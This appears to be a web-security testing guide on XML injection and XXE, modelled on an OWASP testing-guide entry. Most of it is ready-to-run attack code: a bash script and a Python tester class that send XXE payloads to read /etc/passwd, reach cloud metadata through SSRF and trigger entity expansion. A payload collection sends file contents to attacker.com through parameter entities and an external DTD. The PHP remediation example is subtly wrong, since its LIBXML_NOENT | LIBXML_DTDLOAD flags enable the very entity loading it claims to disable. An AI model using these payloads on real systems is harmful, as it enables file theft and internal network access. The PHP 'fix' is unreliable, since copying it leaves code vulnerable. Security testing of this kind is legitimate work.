# WSTG-INPV-07: Testing for XML Injection

## Test ID
WSTG-INPV-07

## Test Name
Testing for XML Injection

## High-Level Description

XML Injection occurs when user input is incorporated into XML documents without proper validation or encoding. This includes XML External Entity (XXE) injection, XPath injection, and XML tag injection. These vulnerabilities can lead to data disclosure, server-side request forgery, denial of service, or remote code execution.

---

## What to Check

- [ ] XML External Entity (XXE) injection
- [ ] Billion Laughs attack (XML bomb)
- [ ] XML tag injection
- [ ] SOAP injection
- [ ] XML parameter entities
- [ ] Blind XXE via out-of-band

---

## How to Test

### Step 1: Identify XML Processing

```bash
#!/bin/bash
TARGET="https://target.com/api/process"

# Test basic XXE
echo "[*] Testing for XXE..."

XXE_PAYLOAD='<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>'

curl -s -X POST "$TARGET" \
    -H "Content-Type: application/xml" \
    -d "$XXE_PAYLOAD"

# Test with PHP wrapper
XXE_PHP='<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<data>&xxe;</data>'

curl -s -X POST "$TARGET" \
    -H "Content-Type: application/xml" \
    -d "$XXE_PHP"
```

### Step 2: XML Injection Tester

```python
#!/usr/bin/env python3
"""
XML Injection Vulnerability Tester (including XXE)
"""

import requests
import base64
import re

class XMLInjectionTester:
    def __init__(self, url):
        self.url = url
        self.findings = []
        self.session = requests.Session()

    # XXE payloads
    XXE_PAYLOADS = {
        'file_read': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>''',

        'file_read_windows': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
]>
<data>&xxe;</data>''',

        'php_wrapper': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<data>&xxe;</data>''',

        'ssrf': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<data>&xxe;</data>''',

        'parameter_entity': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<data>test</data>''',

        'billion_laughs': '''<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>''',
    }

    # XML error patterns
    XML_ERRORS = [
        r'XML Parsing Error',
        r'XMLSyntaxError',
        r'parser error',
        r'org\.xml\.sax',
        r'javax\.xml',
        r'DOMDocument',
        r'simplexml_load',
        r'lxml\.etree',
        r'SAXParseException',
        r'PCDATA invalid Char',
    ]

    def test_xxe_file_read(self):
        """Test XXE for local file reading"""
        print("\n[*] Testing XXE file read...")

        for name, payload in [
            ('Linux', self.XXE_PAYLOADS['file_read']),
            ('Windows', self.XXE_PAYLOADS['file_read_windows']),
            ('PHP Wrapper', self.XXE_PAYLOADS['php_wrapper']),
        ]:
            try:
                response = self.session.post(
                    self.url,
                    data=payload,
                    headers={'Content-Type': 'application/xml'}
                )

                # Check for /etc/passwd content
                if 'root:' in response.text or 'bin/bash' in response.text:
                    print(f"[VULN] XXE File Read ({name})!")
                    self.findings.append({
                        'type': 'XXE File Read',
                        'variant': name,
                        'severity': 'Critical'
                    })
                    return True

                # Check for base64 encoded content
                base64_pattern = re.search(r'[A-Za-z0-9+/=]{50,}', response.text)
                if base64_pattern:
                    try:
                        decoded = base64.b64decode(base64_pattern.group())
                        if b'root:' in decoded:
                            print(f"[VULN] XXE File Read via PHP wrapper!")
                            self.findings.append({
                                'type': 'XXE File Read (Base64)',
                                'severity': 'Critical'
                            })
                            return True
                    except:
                        pass

            except Exception as e:
                pass

        return False

    def test_xxe_ssrf(self):
        """Test XXE for SSRF"""
        print("\n[*] Testing XXE SSRF...")

        try:
            response = self.session.post(
                self.url,
                data=self.XXE_PAYLOADS['ssrf'],
                headers={'Content-Type': 'application/xml'},
                timeout=10
            )

            # Check for AWS metadata
            if 'ami-id' in response.text or 'instance-id' in response.text:
                print(f"[VULN] XXE SSRF - AWS Metadata accessible!")
                self.findings.append({
                    'type': 'XXE SSRF',
                    'detail': 'AWS Metadata',
                    'severity': 'Critical'
                })
                return True

        except Exception as e:
            pass

        return False

    def test_blind_xxe(self):
        """Test blind XXE via out-of-band"""
        print("\n[*] Testing blind XXE (OOB)...")

        # This requires an attacker-controlled server
        blind_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR-COLLABORATOR-SERVER/xxe">
  %xxe;
]>
<data>test</data>'''

        print("  [INFO] For blind XXE, use Burp Collaborator or similar")
        print("  [INFO] Check for DNS/HTTP callbacks")

        return False

    def test_xml_tag_injection(self):
        """Test XML tag injection"""
        print("\n[*] Testing XML tag injection...")

        payloads = [
            '<user>admin</user><role>admin</role>',
            ']]><admin>true</admin><!--',
            '</data><injected>true</injected><data>',
        ]

        for payload in payloads:
            xml_doc = f'''<?xml version="1.0"?>
<root>
  <data>{payload}</data>
</root>'''

            try:
                response = self.session.post(
                    self.url,
                    data=xml_doc,
                    headers={'Content-Type': 'application/xml'}
                )

                if 'admin' in response.text and response.status_code == 200:
                    print(f"[WARN] XML tag injection may be possible")

            except Exception as e:
                pass

    def test_dos(self):
        """Test XML Denial of Service"""
        print("\n[*] Testing XML DoS (Billion Laughs)...")

        # Use limited version to avoid actual DoS
        mini_bomb = '''<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;">
]>
<lolz>&lol2;</lolz>'''

        try:
            response = self.session.post(
                self.url,
                data=mini_bomb,
                headers={'Content-Type': 'application/xml'},
                timeout=5
            )

            if 'lollollol' in response.text:
                print("[WARN] Entity expansion is enabled")
                self.findings.append({
                    'type': 'XML Entity Expansion Enabled',
                    'severity': 'Medium',
                    'note': 'DoS via XML bomb may be possible'
                })

        except requests.exceptions.Timeout:
            print("[WARN] Request timed out - possible DoS vulnerability")

        except Exception as e:
            pass

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("XML INJECTION REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo XML injection vulnerabilities confirmed.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['type']}")
                if 'detail' in f:
                    print(f"  Detail: {f['detail']}")
                if 'note' in f:
                    print(f"  Note: {f['note']}")

    def run_tests(self):
        """Run all XML injection tests"""
        self.test_xxe_file_read()
        self.test_xxe_ssrf()
        self.test_blind_xxe()
        self.test_xml_tag_injection()
        self.test_dos()
        self.generate_report()

# Usage
tester = XMLInjectionTester("https://target.com/api/xml")
tester.run_tests()
```

### Step 3: XXE Payload Collection

```xml
<!-- Basic XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

<!-- XXE via Parameter Entity -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
  %eval;
  %exfil;
]>

<!-- Blind XXE with external DTD -->
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd">
<foo>test</foo>

<!-- evil.dtd on attacker server -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;

<!-- XXE in SVG -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>

<!-- XXE in SOAP -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <data>&xxe;</data>
  </soap:Body>
</soap:Envelope>
```

---

## Tools

| Tool | Purpose |
|------|---------|
| Burp Suite | XXE testing |
| XXEinjector | Automated XXE |
| OXML_XXE | Office XXE |
| xxe-recursive-download | File exfiltration |

---

## Remediation

```java
// Java - Disable external entities
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setExpandEntityReferences(false);
```

```python
# Python - defusedxml
from defusedxml import ElementTree
tree = ElementTree.parse(xml_file)

# Or configure lxml
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)
```

```php
<?php
// PHP - Disable external entities
libxml_disable_entity_loader(true);
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
?>
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| XXE file read | 9.1 | Critical |
| XXE SSRF | 9.1 | Critical |
| Blind XXE | 7.5 | High |
| XML DoS (Billion Laughs) | 7.5 | High |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-611** | Improper Restriction of XML External Entity Reference |
| **CWE-91** | XML Injection |

---

## Checklist

```
[ ] XXE file read tested
[ ] XXE SSRF tested
[ ] Blind XXE tested
[ ] XML DoS tested
[ ] Tag injection tested
[ ] Different file protocols tested
[ ] Findings documented
```
